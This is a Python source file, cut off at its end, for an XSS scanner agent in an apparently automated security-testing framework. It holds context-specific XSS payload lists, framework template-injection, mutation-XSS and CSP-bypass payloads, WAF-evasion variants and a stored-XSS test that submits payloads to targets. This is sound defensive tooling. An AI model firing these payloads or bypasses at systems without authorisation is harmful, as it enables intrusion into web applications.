"""
XSS (Cross-Site Scripting) Security Agent - Enhanced Version
Detects Reflected, Stored, DOM-based, and Mutation XSS vulnerabilities.
"""
from typing import List, Dict, Any, Optional, TYPE_CHECKING, Tuple, Set
import re
import html
import asyncio
import uuid
import logging
from urllib.parse import urljoin, urlparse, quote
from enum import Enum
from dataclasses import dataclass
from collections import defaultdict

from .base_agent import BaseSecurityAgent, AgentResult
from .waf_evasion import WAFEvasionMixin
from models.vulnerability import Severity, VulnerabilityType

if TYPE_CHECKING:
    from core.scan_context import ScanContext

# Configure logging
logger = logging.getLogger(__name__)


class XSSContext(str, Enum):
    """XSS injection context types."""
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    CSS = "css"
    JSON = "json"
    UNKNOWN = "unknown"


@dataclass
class XSSAgentConfig:
    """Configuration for XSS testing."""
    MAX_ENDPOINTS: int = 20
    MAX_PAYLOADS_PER_PARAM: int = 10
    MAX_PARAMS_PER_ENDPOINT: int = 5
    BATCH_SIZE: int = 3
    EARLY_EXIT_ON_FIRST_VULN: bool = True
    STORED_XSS_RETRIEVAL_DELAY: float = 1.0
    DOM_XSS_CONFIDENCE_THRESHOLD: int = 60

    # Context-specific payload limits
    CONTEXT_PAYLOAD_LIMITS: Dict[XSSContext, int] = None

    def __post_init__(self):
        if self.CONTEXT_PAYLOAD_LIMITS is None:
            self.CONTEXT_PAYLOAD_LIMITS = {
                XSSContext.HTML_BODY: 8,
                XSSContext.HTML_ATTRIBUTE: 6,
                XSSContext.JAVASCRIPT: 10,
                XSSContext.URL: 5,
                XSSContext.CSS: 4,
                XSSContext.JSON: 5
            }


@dataclass
class CSPAnalysis:
    """Content Security Policy analysis result."""
    can_execute_inline: bool
    can_load_external: bool
    can_use_eval: bool
    bypass_suggestions: List[str]
    severity_modifier: float  # Multiplier for severity (0.5 = reduced, 1.5 = increased)


@dataclass
class DOMXSSFlow:
    """Represents a potential DOM XSS data flow."""
    source: str
    source_description: str
    variable: str
    sink: str
    confidence: str
    code_snippet: str


class XSSAgent(BaseSecurityAgent, WAFEvasionMixin):
    """
    Enhanced Cross-Site Scripting (XSS) testing agent.

    Features:
    - Context-aware reflected XSS detection
    - Stored XSS testing
    - DOM-based XSS source-sink tracing
    - Mutation XSS (mXSS) detection
    - Framework-specific payloads
    - CSP analysis and bypass suggestions
    - Batched testing for performance
    """

    agent_name = "xss"
    agent_description = "Detects Cross-Site Scripting (XSS) vulnerabilities"
    vulnerability_types = [
        VulnerabilityType.XSS_REFLECTED,
        VulnerabilityType.XSS_STORED,
        VulnerabilityType.XSS_DOM
    ]

    # Context-specific payloads
    CONTEXT_PAYLOADS = {
        XSSContext.HTML_BODY: [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
        ],
        XSSContext.HTML_ATTRIBUTE: [
            "\" onmouseover=\"alert('XSS')\"",
            "' onfocus='alert(1)' autofocus='",
            "\" onfocus=\"alert(1)\" autofocus=\"",
            "\" onclick=\"alert(1)\"",
            "' onclick='alert(1)'",
            "\">' <script>alert(1)</script>",
            "'> <img src=x onerror=alert(1)>",
            "' accesskey='x' onclick='alert(1)'",
        ],
        XSSContext.JAVASCRIPT: [
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "\\';alert('XSS');//",
            "\\u0027;alert\\u0028\\u0027XSS\\u0027\\u0029;//",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "\\x27;alert(1);//",
        ],
        XSSContext.URL: [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "vbscript:alert('XSS')",
            "javascript:eval('alert(1)')",
        ],
        XSSContext.CSS: [
            "expression(alert('XSS'))",
            "url(javascript:alert('XSS'))",
            "}</style><script>alert('XSS')</script>",
            "behavior:url(xss.htc)",
            "-moz-binding:url(xss.xml#xss)",
        ],
        XSSContext.JSON: [
            "\"},\"xss\":\"<script>alert(1)</script>",
            "\\u0027;alert(1);//",
            "\";alert(1);//",
        ]
    }

    # Framework-specific XSS payloads
    FRAMEWORK_SPECIFIC_PAYLOADS = {
        "React": [
            "javascript:alert('XSS')",  # dangerouslySetInnerHTML
            "{constructor.constructor('alert(1)')()}",
            "<img src=x onerror=alert('XSS')>",
        ],
        "Vue.js": [
            "{{constructor.constructor('alert(1)')()}}",
            "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
            "{{_c.constructor('alert(1)')()}}",
        ],
        "Angular": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></div>",
        ],
        "jQuery": [
            "<img src=x onerror=alert('XSS')>",
            "<script>$(function(){alert('XSS')})</script>",
        ]
    }

    # Mutation XSS payloads
    MUTATION_XSS_PAYLOADS = [
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
        "<style><!--</style><script>alert(1)</script>-->",
        "<<SCRIPT>alert(1);//<</SCRIPT>",
        "<svg><style><img src=x onerror=alert(1)></style>",
        "<math><mtext></mtext><img src=x onerror=alert(1)></math>",
        "<table><td background=\"javascript:alert(1)\">",
    ]

    # CSP bypass payloads
    CSP_BYPASS_PAYLOADS = [
        "<link rel=\"import\" href=\"data:text/html,<script>alert(1)</script>\">",
        "<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert(1)\">",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "<embed src=\"data:text/html,<script>alert(1)</script>\">",
        "<base href=\"javascript:alert(1)/\">",
    ]

    # Unique marker for reflection detection
    REFLECTION_MARKER = "MATRIX_XSS_TEST_"

    # DOM XSS patterns
    DOM_SOURCES = {
        'location.search': 'URL query parameters',
        'location.hash': 'URL fragment',
        'document.referrer': 'Referrer header',
        'window.name': 'Window name property',
        'document.cookie': 'Cookie data',
        'localStorage': 'Local storage',
        'sessionStorage': 'Session storage',
        'document.location': 'Document location',
        'location.href': 'Location href',
        'postMessage': 'Cross-origin messages'
    }

    DOM_SINKS = [
        r"document\.write\s*\(",
        r"document\.writeln\s*\(",
        r"\.innerHTML\s*=",
        r"\.outerHTML\s*=",
        r"\.insertAdjacentHTML\s*\(",
        r"eval\s*\(",
        r"setTimeout\s*\([^,)]*['\"][^'\"]*['\"]",
        r"setInterval\s*\([^,)]*['\"][^'\"]*['\"]",
        r"new\s+Function\s*\(",
        r"location\s*=",
        r"location\.href\s*=",
        r"location\.replace\s*\(",
        r"location\.assign\s*\(",
        r"\.src\s*=",
        r"\.setAttribute\s*\(\s*['\"]onclick['\"]",
    ]

    def __init__(self, config: Optional[XSSAgentConfig] = None, **kwargs):
        """Initialize XSS agent."""
        super().__init__(**kwargs)
        self.config = config or XSSAgentConfig()
        self.dom_sink_patterns = [re.compile(p, re.IGNORECASE) for p in self.DOM_SINKS]
        self.test_id = 0
        self.tested_params: Set[Tuple[str, str]] = set()  # Track (url, param) pairs
        logger.info(f"XSS Agent initialized with config: {self.config}")

    def _detect_reflection_context(self, marker: str, response_text: str) -> Tuple[XSSContext, str]:
        """
        Detect the context in which input is reflected.

        Args:
            marker: The test marker string
            response_text: The HTTP response text

        Returns:
            Tuple of (XSSContext, surrounding_context)
        """
        if marker not in response_text:
            return XSSContext.UNKNOWN, ""

        # Find position of marker
        pos = response_text.find(marker)
        start = max(0, pos - 200)
        end = min(len(response_text), pos + len(marker) + 200)
        context = response_text[start:end]

        before_marker = response_text[start:pos]
        after_marker = response_text[pos + len(marker):end]

        # Check for JavaScript context (inside <script> tags)
        last_script_open = before_marker.rfind('<script')
        last_script_close = before_marker.rfind('</script>')
        if last_script_open != -1 and last_script_open > last_script_close:
            # We're inside an open script tag
            logger.debug(f"Detected JavaScript context for marker: {marker}")
            return XSSContext.JAVASCRIPT, context

        # Check if inside a JavaScript string
        if re.search(r'<script[^>]*>', before_marker, re.IGNORECASE):
            # Count quotes to see if we're in a string
            js_content = before_marker.split('<script')[-1]
            single_quotes = js_content.count("'") - js_content.count("\\'")
            double_quotes = js_content.count('"') - js_content.count('\\"')
            if single_quotes % 2 == 1 or double_quotes % 2 == 1:
                return XSSContext.JAVASCRIPT, context

        # Check for URL context (href, src, action, etc.)
        url_attr_pattern = r'(href|src|action|formaction|data|poster|cite|srcdoc|codebase)\s*=\s*["\']?[^"\'>]*$'
        if re.search(url_attr_pattern, before_marker, re.IGNORECASE):
            logger.debug(f"Detected URL context for marker: {marker}")
            return XSSContext.URL, context

        # Check for HTML attribute context
        attr_pattern = r'<[^>]+\s+\w+\s*=\s*["\']?[^"\'>]*$'
        if re.search(attr_pattern, before_marker):
            logger.debug(f"Detected HTML attribute context for marker: {marker}")
            return XSSContext.HTML_ATTRIBUTE, context

        # Check for CSS context (inside <style> tags)
        last_style_open = before_marker.rfind('<style')
        last_style_close = before_marker.rfind('</style>')
        if last_style_open != -1 and last_style_open > last_style_close:
            return XSSContext.CSS, context

        if re.search(r'style\s*=\s*["\'][^"\']*$', before_marker, re.IGNORECASE):
            return XSSContext.CSS, context

        # Check for JSON context
        if re.search(r'\{\s*["\'][^"\']*["\']\s*:\s*["\'][^"\']*$', before_marker):
            return XSSContext.JSON, context

        # Default: HTML body context
        logger.debug(f"Detected HTML body context for marker: {marker}")
        return XSSContext.HTML_BODY, context

    def _get_payloads_for_context(self, context: XSSContext) -> List[str]:
        """Get appropriate payloads for the detected context."""
        base_payloads = self.CONTEXT_PAYLOADS.get(context, self.CONTEXT_PAYLOADS[XSSContext.HTML_BODY]).copy()

        # Apply context-specific limit
        limit = self.config.CONTEXT_PAYLOAD_LIMITS.get(context, 8)
        payloads = base_payloads[:limit]

        # Add mutation XSS payloads for HTML contexts
        if context in [XSSContext.HTML_BODY, XSSContext.HTML_ATTRIBUTE]:
            payloads.extend(self.MUTATION_XSS_PAYLOADS[:2])

        # Add WAF evasion variants for top payloads
        if context in [XSSContext.HTML_BODY, XSSContext.HTML_ATTRIBUTE]:
            for base_payload in payloads[:2]:
                try:
                    variants = self.get_xss_variants(base_payload)
                    payloads.extend(variants[:1])  # Add 1 variant per base payload
                except Exception as e:
                    logger.warning(f"Error generating variants for {base_payload}: {e}")

        return payloads

    def _analyze_csp_for_xss(self, csp_header: Optional[str]) -> CSPAnalysis:
        """
        Analyze CSP header to determine XSS exploitability.

        Args:
            csp_header: Content-Security-Policy header value

        Returns:
            CSPAnalysis with exploitability assessment
        """
        if not csp_header:
            return CSPAnalysis(
                can_execute_inline=True,
                can_load_external=True,
                can_use_eval=True,
                bypass_suggestions=[],
                severity_modifier=1.5  # No CSP = higher severity
            )

        csp_lower = csp_header.lower()
        bypass_suggestions = []

        # Check for unsafe directives
        can_execute_inline = "'unsafe-inline'" in csp_lower
        can_use_eval = "'unsafe-eval'" in csp_lower
        can_load_external = False

        # Analyze script-src
        if "script-src" not in csp_lower:
            can_load_external = True
            bypass_suggestions.append("No script-src directive - load from any domain")
        else:
            # Extract script-src value
            script_src_match = re.search(r'script-src\s+([^;]+)', csp_lower)
            if script_src_match:
                script_src = script_src_match.group(1)
                if "*" in script_src or "https:" in script_src or "http:" in script_src:
                    can_load_external = True
                    bypass_suggestions.append("Wildcard or protocol in script-src - load from whitelisted domains")

        # Check for base-uri (base tag injection)
        if "base-uri" not in csp_lower:
            bypass_suggestions.append("No base-uri directive - inject <base> tag to hijack relative URLs")

        # Check for form-action
        if "form-action" not in csp_lower:
            bypass_suggestions.append("No form-action directive - exfiltrate data via form submission")

        # Check for object-src
        if "object-src" not in csp_lower or "'none'" not in csp_lower:
            bypass_suggestions.append("object-src allows plugins - use <object> or <embed> tags")

        # JSONP endpoints bypass
        if can_load_external:
            bypass_suggestions.append("Look for JSONP endpoints on whitelisted domains")

        # Calculate severity modifier
        if can_execute_inline and can_use_eval:
            severity_modifier = 1.3  # Weak CSP
        elif can_execute_inline or can_use_eval:
            severity_modifier = 1.1  # Moderate CSP
        else:
            severity_modifier = 0.7  # Strong CSP reduces exploitability

        logger.info(f"CSP Analysis: inline={can_execute_inline}, eval={can_use_eval}, "
                   f"external={can_load_external}, bypasses={len(bypass_suggestions)}")

        return CSPAnalysis(
            can_execute_inline=can_execute_inline,
            can_load_external=can_load_external,
            can_use_eval=can_use_eval,
            bypass_suggestions=bypass_suggestions,
            severity_modifier=severity_modifier
        )

    def _trace_dom_xss_flow(self, js_code: str) -> List[DOMXSSFlow]:
        """
        Trace data flow from sources to sinks in JavaScript.

        Args:
            js_code: JavaScript code to analyze

        Returns:
            List of potential DOM XSS vulnerabilities
        """
        vulnerabilities = []

        for source_pattern, source_desc in self.DOM_SOURCES.items():
            if source_pattern not in js_code:
                continue

            # Find variable assignments from this source
            # Pattern: var x = location.search or let y = document.cookie
            var_pattern = rf'(?:var|let|const)\s+(\w+)\s*=\s*.*?{re.escape(source_pattern)}'
            matches = re.finditer(var_pattern, js_code, re.MULTILINE)

            for match in matches:
                var_name = match.group(1)
                source_line = match.group(0)

                # Check if this variable flows to a dangerous sink
                for sink_pattern in self.dom_sink_patterns:
                    sink_pattern_str = sink_pattern.pattern

                    # Look for usage of the variable in a sink
                    # This is a simplified taint analysis
                    sink_usage_pattern = rf'{re.escape(var_name)}.*?{sink_pattern_str}|{sink_pattern_str}.*?{re.escape(var_name)}'
                    sink_match = re.search(sink_usage_pattern, js_code, re.DOTALL | re.IGNORECASE)

                    if sink_match:
                        # Extract code snippet
                        snippet_start = max(0, sink_match.start() - 100)
                        snippet_end = min(len(js_code), sink_match.end() + 100)
                        snippet = js_code[snippet_start:snippet_end].strip()

                        # Check for sanitization between source and sink
                        between_code = js_code[match.end():sink_match.start()]
                        has_sanitization = any(
                            keyword in between_code.lower()
                            for keyword in ['escape', 'encode', 'sanitize', 'dompurify', 'textcontent']
                        )

                        confidence = 'low' if has_sanitization else 'high'

                        vulnerabilities.append(DOMXSSFlow(
                            source=source_pattern,
                            source_description=source_desc,
                            variable=var_name,
                            sink=sink_pattern_str,
                            confidence=confidence,
                            code_snippet=snippet[:200]
                        ))

                        logger.debug(f"Found DOM XSS flow: {source_pattern} -> {var_name} -> {sink_pattern_str}")

        return vulnerabilities

    def _is_xss_reflected(self, payload: str, response: str, context: XSSContext = XSSContext.HTML_BODY) -> bool:
        """
        Check if XSS payload is reflected dangerously based on context.

        Args:
            payload: XSS payload used
            response: Response text
            context: The injection context

        Returns:
            True if payload is dangerously reflected
        """
        # Check for exact reflection (no encoding)
        if payload in response:
            logger.debug(f"Exact payload reflection detected: {payload[:50]}...")
            return True

        # Check for HTML entity encoding (safe)
        encoded_payload = html.escape(payload)
        if encoded_payload in response and payload not in response:
            logger.debug("Payload is HTML encoded (safe)")
            return False

        # Context-specific dangerous pattern checks
        dangerous_patterns = []

        if context == XSSContext.HTML_BODY:
            dangerous_patterns = [
                r"<script[^>]*>.*?alert",
                r"<svg[^>]*onload",
                r"<img[^>]*onerror",
                r"<body[^>]*onload",
                r"<iframe[^>]*src\s*=\s*[\"']?javascript:",
                r"<details[^>]*ontoggle",
                r"<video[^>]*onerror",
            ]
        elif context == XSSContext.HTML_ATTRIBUTE:
            dangerous_patterns = [
                r"on\w+\s*=\s*[\"']?alert",
                r"javascript:\s*alert",
                r"[\"']>\s*<script",
                r"[\"']>\s*<img[^>]*onerror",
            ]
        elif context == XSSContext.JAVASCRIPT:
            dangerous_patterns = [
                r"['\"];\s*alert\s*\(",
                r"</script>\s*<script",
                r"\\u0027;\s*alert",
            ]
        elif context == XSSContext.URL:
            dangerous_patterns = [
                r"javascript:\s*alert",
                r"data:text/html.*<script",
                r"vbscript:",
            ]
        elif context == XSSContext.CSS:
            dangerous_patterns = [
                r"expression\s*\(",
                r"url\s*\(\s*javascript:",
                r"</style>\s*<script",
            ]
        else:
            dangerous_patterns = [
                r"<script[^>]*>",
                r"javascript:",
                r"on\w+\s*=",
                r"<img[^>]*onerror",
            ]

        # Check for dangerous patterns in response
        for pattern in dangerous_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                if re.search(pattern, response, re.IGNORECASE):
                    logger.debug(f"Dangerous pattern found: {pattern}")
                    return True

        return False

    def _detect_framework(self, technology_stack: List[str]) -> Optional[str]:
        """Detect frontend framework from technology stack."""
        if not technology_stack:
            return None

        tech_lower = [t.lower() for t in technology_stack]
        tech_string = " ".join(tech_lower)

        frameworks = ["React", "Vue.js", "Angular", "jQuery"]
        for framework in frameworks:
            if framework.lower() in tech_string:
                logger.info(f"Detected framework: {framework}")
                return framework

        return None

    def _select_payloads(
        self,
        framework: Optional[str],
        scan_context: Optional["ScanContext"]
    ) -> List[str]:
        """Select XSS payloads based on framework and CSP policy."""
        payloads = []

        # Start with basic payloads
        payloads.extend(self.CONTEXT_PAYLOADS[XSSContext.HTML_BODY][:5])

        # Add framework-specific payloads
        if framework and framework in self.FRAMEWORK_SPECIFIC_PAYLOADS:
            framework_payloads = self.FRAMEWORK_SPECIFIC_PAYLOADS[framework]
            payloads.extend(framework_payloads)
            logger.info(f"Added {len(framework_payloads)} {framework}-specific payloads")

        # Analyze CSP and add bypass payloads if needed
        csp_header = None
        if scan_context and hasattr(scan_context, 'csp_policy'):
            csp_header = scan_context.csp_policy

        if csp_header:
            csp_analysis = self._analyze_csp_for_xss(csp_header)
            if not csp_analysis.can_execute_inline:
                logger.info("CSP blocks inline scripts, adding bypass payloads")
                payloads.extend(self.CSP_BYPASS_PAYLOADS[:3])

        # Add mutation XSS payloads
        payloads.extend(self.MUTATION_XSS_PAYLOADS[:3])

        # Add attribute and event handler payloads
        payloads.extend(self.CONTEXT_PAYLOADS[XSSContext.HTML_ATTRIBUTE][:3])

        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        logger.info(f"Selected {len(unique_payloads)} total payloads for testing")
        return unique_payloads

    async def scan(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        technology_stack: List[str] = None,
        scan_context: Optional["ScanContext"] = None
    ) -> List[AgentResult]:
        """
        Scan for XSS vulnerabilities with enhanced detection.

        Args:
            target_url: Base URL
            endpoints: Endpoints to test
            technology_stack: Detected technologies
            scan_context: Shared scan context

        Returns:
            List of found vulnerabilities
        """
        results = []

        # Detect framework and select payloads
        detected_framework = self._detect_framework(technology_stack or [])
        payloads_to_use = self._select_payloads(detected_framework, scan_context)

        logger.info(f"Starting XSS scan with {len(payloads_to_use)} payloads "
                   f"(framework: {detected_framework or 'generic'})")

        tested_count = 0
        vuln_count = 0

        for endpoint in endpoints[:self.config.MAX_ENDPOINTS]:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "GET")
            params = endpoint.get("params", {})

            # Skip if no parameters
            if not params:
                # Still check for DOM XSS
                dom_result = await self._check_dom_xss(url)
                if dom_result:
                    results.append(dom_result)
                    vuln_count += 1
                continue

            tested_count += 1
            logger.info(f"Testing endpoint {tested_count}: {method} {url}")

            # Test each parameter
            param_count = 0
            for param_name in params.keys():
                if param_count >= self.config.MAX_PARAMS_PER_ENDPOINT:
                    logger.debug(f"Reached max params limit for {url}")
                    break

                # Skip if already tested
                test_key = (url, param_name)
                if test_key in self.tested_params:
                    continue

                self.tested_params.add(test_key)
                param_count += 1

                # Test reflected XSS
                reflected_result = await self._test_reflected_xss(
                    url, method, params, param_name, payloads_to_use
                )

                if reflected_result:
                    results.append(reflected_result)
                    vuln_count += 1

                    if self.config.EARLY_EXIT_ON_FIRST_VULN:
                        logger.info(f"Found vulnerability in {param_name}, skipping remaining params")
                        break

                # Test stored XSS (more invasive)
                if not reflected_result and method.upper() in ["POST", "PUT"]:
                    stored_result = await self._test_stored_xss(
                        url, method, params, param_name
                    )

                    if stored_result:
                        results.append(stored_result)
                        vuln_count += 1

            # Check for DOM XSS
            dom_result = await self._check_dom_xss(url)
            if dom_result:
                results.append(dom_result)
                vuln_count += 1

        logger.info(f"XSS scan complete. Tested {tested_count} endpoints, "
                   f"found {vuln_count} vulnerabilities")

        return results

    async def _test_reflected_xss(
        self,
        url: str,
        method: str,
        params: Dict,
        param_name: str,
        payloads: List[str]
    ) -> Optional[AgentResult]:
        """
        Test for reflected XSS with context-aware payloads.

        Args:
            url: Target URL
            method: HTTP method
            params: Parameters
            param_name: Parameter to test
            payloads: Payloads to use

        Returns:
            AgentResult if vulnerable, None otherwise
        """
        self.test_id += 1
        marker = f"{self.REFLECTION_MARKER}{self.test_id}"

        # Step 1: Test for reflection
        test_params = params.copy()
        test_params[param_name] = marker

        try:
            response = await self.make_request(
                url,
                method=method,
                params=test_params if method.upper() == "GET" else None,
                data=test_params if method.upper() != "GET" else None
            )

            if not response:
                return None

            response_text = response.text

            # Check if marker is reflected
            if marker not in response_text:
                logger.debug(f"No reflection detected for param '{param_name}'")
                return None

            # Step 2: Detect reflection context
            context, surrounding = self._detect_reflection_context(marker, response_text)
            logger.info(f"Reflection detected in {context.value} context for '{param_name}'")

            # Step 3: Get context-appropriate payloads
            context_payloads = self._get_payloads_for_context(context)

            # Merge with provided payloads
            all_payloads = list(set(context_payloads + payloads[:5]))

            # Step 4: Test payloads
            for payload in all_payloads[:self.config.MAX_PAYLOADS_PER_PARAM]:
                test_params[param_name] = payload

                response = await self.make_request(
                    url,
                    method=method,
                    params=test_params if method.upper() == "GET" else None,
                    data=test_params if method.upper() != "GET" else None
                )

                if not response:
                    continue

                response_text = response.text

                # Check if payload is dangerously reflected
                if self._is_xss_reflected(payload, response_text, context):
                    logger.info(f"XSS vulnerability confirmed with payload: {payload[:50]}...")

                    # Get CSP analysis for severity adjustment
                    csp_header = response.headers.get('Content-Security-Policy')
                    csp_analysis = self._analyze_csp_for_xss(csp_header)

                    # Calculate adjusted severity
                    base_severity = Severity.HIGH
                    if csp_analysis.severity_modifier <= 0.7:
                        adjusted_severity = Severity.MEDIUM
                    elif csp_analysis.severity_modifier >= 1.3:
                        adjusted_severity = Severity.CRITICAL
                    else:
                        adjusted_severity = base_severity

                    # Analyze with AI
                    ai_analysis = await self.analyze_with_ai(
                        vulnerability_type="Cross-Site Scripting (Reflected)",
                        context=f"Parameter '{param_name}' in {context.value} context\nPayload: {payload}\nCSP: {csp_header or 'None'}",
                        response_data=response_text[:1500]
                    )

                    # Build description
                    description = (
                        f"A reflected Cross-Site Scripting (XSS) vulnerability was detected in the '{param_name}' parameter. "
                        f"User input is reflected in {context.value} context without proper encoding, "
                        f"allowing execution of arbitrary JavaScript code."
                    )

                    if csp_analysis.bypass_suggestions:
                        description += f"\n\nCSP Analysis: {len(csp_analysis.bypass_suggestions)} potential bypass techniques identified."

                    # Build evidence
                    evidence = f"Payload: {payload}\nContext: {context.value}\nReflection: {surrounding[:200]}"
                    if csp_analysis.bypass_suggestions:
                        evidence += f"\n\nCSP Bypass Suggestions:\n" + "\n".join(
                            f"- {s}" for s in csp_analysis.bypass_suggestions[:3]
                        )

                    return self.create_result_from_ai(
                        ai_analysis=ai_analysis,
                        vulnerability_type=VulnerabilityType.XSS_REFLECTED,
                        severity=adjusted_severity,
                        url=url,
                        parameter=param_name,
                        method=method,
                        title=f"Reflected XSS in '{param_name}' ({context.value} context)",
                        description=description,
                        evidence=evidence,
                        remediation=self._get_context_specific_remediation(context),
                        owasp_category="A03:2021 – Injection",
                        cwe_id="CWE-79",
                        reference_links=[
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                        ],
                        request_data={"params": test_params, "payload": payload},
                        response_snippet=response_text[:500]
                    )

        except Exception as e:
            logger.error(f"Error testing reflected XSS in '{param_name}': {e}", exc_info=True)

        return None

    async def _test_stored_xss(
        self,
        url: str,
        method: str,
        params: Dict,
        param_name: str
    ) -> Optional[AgentResult]:
        """
        Test for stored XSS by submitting payload and checking retrieval.

        Args:
            url: Target URL
            method: HTTP method
            params: Parameters
            param_name: Parameter to test

        Returns:
            AgentResult if vulnerable, None otherwise
        """
        try:
            # Create unique marker
            unique_marker = f"STORED_XSS_{uuid.uuid4().hex[:8]}"
            payload = f"<img src=x onerror=alert('{unique_marker}')>"

            logger.info(f"Testing stored XSS in '{param_name}' with marker: {unique_marker}")

            # Submit payload
            submit_params = params.copy()
            submit_params[param_name] = payload

            submit_response = await self.make_request(
                url,
                method=method,
                data=submit_params
            )

            if not submit_response:
                return None

            # Wait briefly for storage
            await asyncio.sleep(self.config.STORED_XSS_RETRIEVAL_DELAY)

            # Try to retrieve (GET request to same URL)
            retrieval_response = await self.make_request(url, method="GET")

            if not retrieval_response:
                return None

            retrieval_text = retrieval_response.text

            # Check if marker appears in response
            if unique_marker in retrieval_text:
                # Check if payload is executed (unencoded)
                if re.search(rf'<img[^>]+{re.escape(unique_marker)}', retrieval_text, re.IGNORECASE):
                    logger.info(f"Stored XSS confirmed with marker: {unique_marker}")

                    ai_analysis = await self.analyze_with_ai(
                        vulnerability_type="Cross-Site Scripting (Stored)",
                        context=f"Stored XSS in '{param_name}' parameter\nPayload persisted and executed on retrieval",
                        response_data=retrieval_text[:1500]
                    )

                    return self.create_result_from_ai(
                        ai_analysis=ai_analysis,
                        vulnerability_type=VulnerabilityType.XSS_STORED,
                        severity=Severity.CRITICAL,  # Stored XSS is always critical
                        url=url,
                        parameter=param_name,
                        method=method,
                        title=f"Stored XSS in '{param_name}'",
                        description=(
                            f"A stored (persistent) Cross-Site Scripting vulnerability was detected. "
                            f"Malicious JavaScript submitted through the '{param_name}' parameter is "
                            f"stored on the server and executed when the page is viewed by other users."
                        ),
                        evidence=f"Payload: {payload}\nMarker: {unique_marker}\nPersisted and executed on retrieval",
                        remediation=(
                            "1. Implement strict output encoding for all user-generated content\n"
                            "2. Use Content Security Policy (CSP) headers\n"
                            "3. Sanitize input on storage with allowlists\n"
                            "4. Implement contextual output encoding based on where data is displayed"
                        ),
                        owasp_category="A03:2021 – Injection",
                        cwe_id="CWE-79",
                        reference_links=[
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
                        ],
                        request_data={"params": submit_params, "payload": payload}
                    )

        except Exception as e:
            logger.error(f"Error testing stored XSS in '{param_name}': {e}", exc_info=True)

        return None

    async def _check_dom_xss(self, url: str) -> Optional[AgentResult]:
        """
        Check for DOM-based XSS with source-sink tracing.

        Args:
            url: URL to check

        Returns:
            AgentResult if potential DOM XSS found, None otherwise
        """
        try:
            response = await self.make_request(url)
            if not response:
                return None

            response_text = response.text

            # Extract all JavaScript code
            script_blocks = re.findall(
                r'<script[^>]*>(.*?)</script>',
                response_text,
                re.DOTALL | re.IGNORECASE
            )

            if not script_blocks:
                return None

            all_js_code = "\n".join(script_blocks)

            # Perform source-sink tracing
            flows = self._trace_dom_xss_flow(all_js_code)

            if flows:
                # Calculate confidence based on flow analysis
                high_confidence_flows = [f for f in flows if f.confidence == 'high']
                confidence = 80 if high_confidence_flows else 60

                # Build evidence
                evidence_parts = []
                for flow in flows[:3]:  # Show top 3 flows
                    evidence_parts.append(
                        f"Source: {flow.source} ({flow.source_description})\n"
                        f"Variable: {flow.variable}\n"
                        f"Sink: {flow.sink}\n"
                        f"Confidence: {flow.confidence}\n"
                        f"Code: {flow.code_snippet}\n"
                    )

                evidence = "\n---\n".join(evidence_parts)

                logger.info(f"DOM XSS indicators found: {len(flows)} flows "
                           f"({len(high_confidence_flows)} high confidence)")

                return self.create_result(
                    vulnerability_type=VulnerabilityType.XSS_DOM,
                    is_vulnerable=True,
                    severity=Severity.HIGH if high_confidence_flows else Severity.MEDIUM,
                    confidence=confidence,
                    url=url,
                    title="Potential DOM-based XSS",
                    description=(
                        f"The page contains JavaScript code with {len(flows)} dangerous data flow(s) "
                        f"from user-controllable sources to DOM sinks. "
                        f"{'High confidence indicators suggest this is exploitable.' if high_confidence_flows else 'Manual verification recommended.'}"
                    ),
                    evidence=evidence,
                    remediation=(
                        "1. Avoid using dangerous DOM sinks (innerHTML, eval, document.write)\n"
                        "2. Use safe alternatives: textContent, createElement, setAttribute\n"
                        "3. Sanitize all user input with DOMPurify or similar library\n"
                        "4. Validate and encode data from URL parameters and other sources"
                    ),
                    owasp_category="A03:2021 – Injection",
                    cwe_id="CWE-79",
                    reference_links=[
                        "https://owasp.org/www-community/attacks/DOM_Based_XSS",
                        "https://portswigger.net/web-security/cross-site-scripting/dom-based"
                    ]
                )

        except Exception as e:
            logger.error(f"Error checking DOM XSS: {e}", exc_info=True)

        return None

    def _get_context_specific_remediation(self, context: XSSContext) -> str:
        """Get context-specific remediation advice."""
        remediations = {
            XSSContext.HTML_BODY: (
                "1. HTML-encode all user input using proper encoding functions\n"
                "2. Implement Content Security Policy (CSP) headers\n"
                "3. Use templating engines with auto-escaping enabled\n"
                "4. Validate input against allowlists where possible"
            ),
            XSSContext.HTML_ATTRIBUTE: (
                "1. Attribute-encode all user input in HTML attributes\n"
                "2. Always quote attribute values (use double quotes)\n"
                "3. Avoid user input in event handler attributes\n"
                "4. Implement strict CSP with 'unsafe-inline' disabled"
            ),
            XSSContext.JAVASCRIPT: (
                "1. Avoid embedding user input directly in JavaScript\n"
                "2. Use JSON encoding for data passed to JavaScript\n"
                "3. Never use eval() or similar functions with user input\n"
                "4. Store user data in data attributes and read via DOM API"
            ),
